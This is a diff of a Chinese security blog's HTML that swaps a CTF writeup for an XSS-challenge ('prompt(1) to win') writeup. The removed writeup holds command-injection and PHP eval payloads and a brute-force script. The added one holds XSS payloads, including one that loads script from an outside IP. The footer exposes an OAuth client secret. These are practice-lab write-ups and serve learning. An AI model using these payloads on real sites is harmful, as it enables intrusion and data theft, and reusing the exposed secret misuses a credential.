@@ -4,7 +4,7 @@
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <title>hackburger writeup &mdash; Evil</title>
+    <title>prompt(1) to win &mdash; Evil</title>
     <link rel="stylesheet" href="http://localhost:4000/assets/vendor/primer-css/css/primer.css">
     <link rel="stylesheet" href="http://localhost:4000/assets/vendor/primer-markdown/dist/user-content.min.css">
     <link rel="stylesheet" href="http://localhost:4000/assets/vendor/octicons/octicons/octicons.css">
@@ -23,29 +23,29 @@
     
 
     
-    <link rel="canonical" href="http://localhost:4000/2018/08/31/hackburger/">
+    <link rel="canonical" href="http://localhost:4000/2018/09/18/prompt/">
     <link rel="alternate" type="application/atom+xml" title="Evil" href="http://localhost:4000/feed.xml">
     
     <link rel="shortcut icon" href="http://localhost:4000/images/favicon.jpg" >
     
-    <meta property="og:title" content="hackburger writeup">
+    <meta property="og:title" content="prompt(1) to win">
       
     <meta name="keywords" content="Web Security">
     <meta name="og:keywords" content="Web Security">
       
-    <meta name="description" content="全是 Web 安全的题目，很有意思而且还有一点难度，在这里记录一下题目的 writeup， 持续更新……">
-    <meta name="og:description" content="全是 Web 安全的题目，很有意思而且还有一点难度，在这里记录一下题目的 writeup， 持续更新……">
+    <meta name="description" content="xss 的在线练习，挺不错的，整个在线网站看起来也很可以。">
+    <meta name="og:description" content="xss 的在线练习，挺不错的，整个在线网站看起来也很可以。">
       
     
     
         
     
-    <meta property="og:url" content="http://localhost:4000/2018/08/31/hackburger/">
+    <meta property="og:url" content="http://localhost:4000/2018/09/18/prompt/">
     <meta property="og:site_name" content="Evil">
     <meta property="og:type" content="article">
     <meta property="og:locale" content="zh_CN" />
     
-    <meta property="article:published_time" content="2018-08-31">
+    <meta property="article:published_time" content="2018-09-18">
     
     <script src="http://localhost:4000/assets/vendor/jquery/dist/jquery.min.js"></script>
     <script src="http://localhost:4000/assets/js/jquery-ui.js"></script>
@@ -77,29 +77,29 @@
     </header>
     <!-- / header -->
 
-    <section class="collection-head small geopattern" data-pattern-id="hackburger writ">
+    <section class="collection-head small geopattern" data-pattern-id="prompt(1) to wi">
 <div class="container">
   <div class="columns">
     <div class="column three-fourths">
       <div class="collection-title">
-        <h1 class="collection-header">hackburger writeup</h1>
+        <h1 class="collection-header">prompt(1) to win</h1>
         <div class="collection-info">
           
           <span class="meta-info">
-            <span class="octicon octicon-calendar"></span> 2018/08/31
+            <span class="octicon octicon-calendar"></span> 2018/09/18
           </span>
           
           
           <span class="meta-info">
             <span class="octicon octicon-file-directory"></span>
-            <a href="http://localhost:4000/categories/CTF" title="CTF">CTF</a>
+            <a href="http://localhost:4000/categories/web安全" title="web安全">web安全</a>
           </span>
           
 
           
           <span class="meta-info">
             <span class="octicon octicon-tag"></span>
-            <a href="http://localhost:4000/tags/#CTF" title="CTF">CTF</a>
+            <a href="http://localhost:4000/tags/#xss" title="xss">xss</a>
           </span>
           
         </div>
@@ -113,149 +113,118 @@
 <div class="columns">
   <div class="column three-fourths" >
     <article class="article-content markdown-body">
-    <p>全是 Web 安全的题目，很有意思而且还有一点难度，在这里记录一下题目的 writeup， 持续更新……</p>
+    <p>xss 的在线练习，挺不错的，整个在线网站看起来也很可以。</p>
 
 <!--more-->
 
-<h3 id="1warmup">1.Warmup</h3>
+<p><strong>思考一题多解，以及最优解。</strong></p>
 
-<p><strong>tips：</strong></p>
+<h3 id="规则">规则</h3>
+<p>1、成功执行prompt(1).<br />
+2、payload不需要用户交互（成功会显示you won）<br />
+3、payload必须对下述浏览器有效：<br />
+Chrome(最新版) - Firefox(最新版) - IE10 及以上版本(或者IE10兼容模式)<br />
+4、每个级别至少给出两种浏览器的答案<br />
+5、字符越少越好</p>
 
-<p>这里主要就是利用<code class="highlighter-rouge">%0a</code> 做换行操作，猜测是命令执行，用%0a做换行操作。<br />
-这里列一下绕过空格的技巧<code class="highlighter-rouge">${IFS}</code> 或者 <code class="highlighter-rouge">&lt;&gt;</code></p>
+<h3 id="level-0">Level 0</h3>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://burger.laboratorium.ee:7999/?host=127.0.0.1%0als
+<p><strong>payload:</strong></p>
 
-回显
-PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
-64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.040 ms
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"&gt;&lt;script&gt;prompt(1)&lt;/script&gt;&lt;"
 
---- 127.0.0.1 ping statistics ---
-1 packets transmitted, 1 received, 0% packet loss, time 0ms
-rtt min/avg/max/mdev = 0.040/0.040/0.040/0.000 ms
-flag.php
-index.php
-robots.txt
+"&gt;&lt;noembed&gt;&lt;!--&lt;/noembed&gt;&lt;img src=1 onerror=prompt(1)&gt;--&gt;&lt;"
 </code></pre></div></div>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /?host=127.0.0.1%0acat%20flag.php HTTP/1.1
+<h3 id="level-1">Level 1</h3>
+
+<p>这里进行了一点过滤</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// Ext.util.Format.stripTags
+var stripTagsRE = /&lt;\/?[^&gt;]+&gt;/gi;
 </code></pre></div></div>
 
-<h3 id="2file-search">2.File search</h3>
+<p><strong>payload:</strong></p>
 
-<p><strong>第一步：</strong>
-在输入框里面输入文件名里的字符发现回显响应的文件<br />
-同时输入与文件内容里面的字符也会回显包含该内容的文件</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;svg onload=prompt(1) 
 
-<p><strong>第二步：</strong>
-直接用脚本暴力破解</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#coding: utf-8</span>
-<span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">import</span> <span class="nn">string</span>
-<span class="kn">import</span> <span class="nn">re</span>
-
-<span class="n">x</span> <span class="o">=</span> <span class="s">"_0123456789"</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">letters</span>
-<span class="n">url</span> <span class="o">=</span> <span class="s">"http://burger.laboratorium.ee:8004/"</span>
-
-<span class="n">ans</span> <span class="o">=</span> <span class="s">""</span>
-<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
-    <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">x</span><span class="p">:</span>
-        <span class="n">payload1</span> <span class="o">=</span> <span class="p">{</span><span class="s">"query"</span><span class="p">:</span><span class="n">ans</span><span class="o">+</span><span class="n">ch</span><span class="p">}</span>
-        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload1</span><span class="p">)</span>
-        <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">):</span>
-            <span class="n">ans</span> <span class="o">+=</span> <span class="n">ch</span>
-            <span class="k">print</span> <span class="s">"Flag:"</span> <span class="o">+</span> <span class="n">ans</span>
-            <span class="k">break</span>
-
-        <span class="n">payload2</span> <span class="o">=</span> <span class="p">{</span><span class="s">"query"</span><span class="p">:</span> <span class="n">ch</span><span class="o">+</span><span class="n">ans</span><span class="p">}</span>
-        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload2</span><span class="p">)</span>
-        <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">):</span>
-            <span class="n">ans</span> <span class="o">=</span> <span class="n">ch</span> <span class="o">+</span> <span class="n">ans</span>
-            <span class="k">print</span> <span class="s">"Flag:"</span> <span class="o">+</span> <span class="n">ans</span>
-            <span class="k">break</span>
-<span class="c">#t_h_e__f_l_a_g__i_s__4401ac27ffff3318dc0f6a3de050b4169e2eba97</span>
+&lt;img src="" onerror=prompt(1) 
 </code></pre></div></div>
 
-<h3 id="3enter-password-to-get-candy">3.Enter password to get candy</h3>
+<p>后面要有一个空格
+因为 html 会进行自动闭合</p>
 
-<p><strong>猜测是 PHP 中字符串和 0 的弱比较问题</strong></p>
+<p>关于 <code class="highlighter-rouge">&lt;svg&gt;</code>参考<a href="https://www.cnblogs.com/hupeng/archive/2012/12/21/2828456.html">这篇</a></p>
 
-<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
-<span class="nv">$a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-<span class="nv">$b</span> <span class="o">=</span> <span class="s2">"flag?"</span><span class="p">;</span>
-<span class="k">if</span><span class="p">(</span><span class="nv">$a</span><span class="o">==</span><span class="nv">$b</span><span class="p">){</span>
-    <span class="k">echo</span> <span class="s2">"true"</span><span class="p">;</span>
-<span class="p">}</span><span class="k">else</span><span class="p">{</span>
-    <span class="k">echo</span> <span class="s2">"flase"</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="cp">?&gt;</span>
-// 输出是 true
+<h3 id="level-2">Level 2</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//                      v-- frowny face
+input = input.replace(/[=(]/g, '');
 </code></pre></div></div>
 
-<p>所以这里</p>
+<p><strong>Payload</strong></p>
 
-<p>修改 POST 数据</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>data={"password":true}
-
-或 
-
-data={"password":0}
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;svg&gt;&lt;script&gt;prompt&amp;#40;1)&lt;/script&gt;
 </code></pre></div></div>
-<p>即可得到 flag</p>
+<p>由源代码可知，这里过滤了<code class="highlighter-rouge">=(</code>，所以这里我们只要使用<code class="highlighter-rouge">(</code>的字符实体就行了，但是千万要注意这里前面需要加<code class="highlighter-rouge">&lt;svg&gt;</code>,因为只有这样才能保证<code class="highlighter-rouge">&amp;#40;</code>可以被提前解析成 <code class="highlighter-rouge">(</code> 然后与 <code class="highlighter-rouge">&lt;script&gt;&lt;/script&gt;</code>结合，构成可执行的代码。</p>
 
-<h3 id="4number-to-ascii-converter">4.Number to ASCII converter</h3>
+<blockquote>
+  <p>这里的svg不能去掉，由于xml编码特性。在SVG向量里面的script元素（或者其他CDATA元素 ），会先进行xml解析。因此&amp;#x28（十六进制）或者&amp;#40（十进制）或者&amp;lpar；（html实体编码）会被还原成（。</p>
+</blockquote>
 
-<h3 id="assert">assert()</h3>
+<h3 id="level-3">Level 3</h3>
 
-<p>PHP 5</p>
+<p><strong>payload</strong></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bool assert ( mixed $assertion [, string $description ] )
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>--!&gt;&lt;script&gt;prompt(1)&lt;/script&gt;
 </code></pre></div></div>
 
-<p>PHP 7</p>
+<p>源码中显示到 <code class="highlighter-rouge">-&gt;</code> 被过滤，但是这题需要先闭合注释框，2012年后，html标签可以用 <code class="highlighter-rouge">--!&gt;</code>闭合.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bool assert ( mixed $assertion [, Throwable $exception ] )
+<h3 id="level-4">Level 4</h3>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="sr">/^</span><span class="se">(?:</span><span class="sr">https</span><span class="se">?</span><span class="sr">:</span><span class="se">)?\/\/</span><span class="sr">prompt</span><span class="se">\.</span><span class="sr">ml</span><span class="se">\/</span><span class="sr">/i</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">input</span><span class="p">)))</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">script</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'script'</span><span class="p">);</span>
+        <span class="nx">script</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">input</span><span class="p">;</span>
+        <span class="k">return</span> <span class="nx">script</span><span class="p">.</span><span class="nx">outerHTML</span><span class="p">;</span>
+    <span class="p">}</span>
 </code></pre></div></div>
 
-<p>assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的响应。如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</p>
+<p>这题需要绕过限制访问其他域里的 <code class="highlighter-rouge">js</code> 文件，<code class="highlighter-rouge">decodeURIComponent()</code> 这个函数可对<code class="highlighter-rouge">encodeURIComponent()</code> 函数编码的 URI 进行解码，这里可以使用形如 <code class="highlighter-rouge">http://prompt.ml%2f@attacker.com</code> 的链接骗过浏览器，比如 <code class="highlighter-rouge">http://baidu.com%2f@pwdme.cc/</code> 就可以访问 <code class="highlighter-rouge">pwdme.cc</code>，再用 <code class="highlighter-rouge">encodeURIComponent()</code> 编码后的 <code class="highlighter-rouge">/</code> 拼接在链接中就可以执行代码，最终的payload为 <code class="highlighter-rouge">//prompt.ml%2f@pwdme.cc/1.js</code></p>
 
-<p><strong>step1</strong></p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://burger.laboratorium.ee:8001/?number=phpinfo()
+<p>这里我的payload是：</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//prompt.ml%2f@47.104.137.146/level4.js
 </code></pre></div></div>
+<p>直接将上述地址复制到浏览器的地址栏会得到js代码，但还是不行，我们来看看参考答案的解释</p>
+<blockquote>
+  <p>While the first part of the solution for this level is easy to find, using protocol relative URLs and incomplete HTTP Basic Authentication, <strong>the Unicode trick was the hard part.</strong> As can be seen, the ways how browsers treat Unicode in URLs and especially domains is quirky and offers a large playground for attacks and obfuscation.</p>
+</blockquote>
 
-<p>测试这里存在命令执行漏洞</p>
+<p>来自：<a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml#level-1">prompt.ml</a></p>
 
-<p><strong>step2</strong></p>
+<p><strong>还是没有明白我这里到底哪里不行</strong>，按道理说我是绕过了的，但是就是没有回显<code class="highlighter-rouge">Win</code>.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://burger.laboratorium.ee:8001/?number=eval(system("ls"))
+<p>参考：<br />
+<a href="http://pwdme.cc/2016/12/06/prompt-ml-xss/">http://pwdme.cc/2016/12/06/prompt-ml-xss/</a><br />
+<a href="https://hellohxk.com/blog/prompt-1-writeup/">https://hellohxk.com/blog/prompt-1-writeup/</a></p>
 
-http://burger.laboratorium.ee:8001/?number=eval(system("cat where/is/the/flag/i/am/looking/for/flag.php"))
-查看源码搞定
+<h3 id="参考">参考</h3>
 
-或者
-http://burger.laboratorium.ee:8001/?number=eval(system("grep -rn 'flag'*"))
-</code></pre></div></div>
+<p><a href="https://lorexxar.cn/2015/07/02/xss-p/">https://lorexxar.cn/2015/07/02/xss-p/</a></p>
 
-<h3 id="5we-tried-to-clone-pastebin">5.We tried to clone pastebin</h3>
+<p><a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml">https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml</a></p>
 
-<h3 id="6thats-not-how-you-write-signup">6.That’s not how you write signup</h3>
-
-<p><strong>tips</strong>
-注册： <code class="highlighter-rouge">username = admin...很多空格...1</code><br />
-基于 mysql 截断漏洞就相当于注册了 <code class="highlighter-rouge">username = admin</code><br />
-之后就可以用注册时的密码登录，get flag.</p>
+<p><a href="https://blog.csdn.net/qq_35078631/article/details/77073233">https://blog.csdn.net/qq_35078631/article/details/77073233</a></p>
 
     </article>
   
     <div class="newold">
   <hr>
   
-  <b>上一篇: <a href="/2018/08/24/linux_game/">Wargames-Linux 闯关游戏</a></b><br>
+  <b>上一篇: <a href="/2018/08/31/hackburger/">hackburger writeup</a></b><br>
      
   
-  <b>下一篇: <a href="/2018/09/18/prompt/">prompt(1) to win</a></b>
+  <b>下一篇: <a href="/2018/09/19/CBC/">CBC字节翻转攻击</a></b>
    
 </div><!--上一篇 下一篇-->
 
@@ -273,7 +242,7 @@ http://burger.laboratorium.ee:8001/?number=eval(system("grep -rn 'flag'*"))
         <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
         <script>
         var gitalk = new Gitalk({
-            id: '/2018/08/31/hackburger/',
+            id: '/2018/09/18/prompt/',
             clientID: '5a59fdc570f933e0c2ee',
             clientSecret: '4bfb41f4315d6e67dc7d994890a4fc8bf9dee142',
             repo: 'blogcomments',
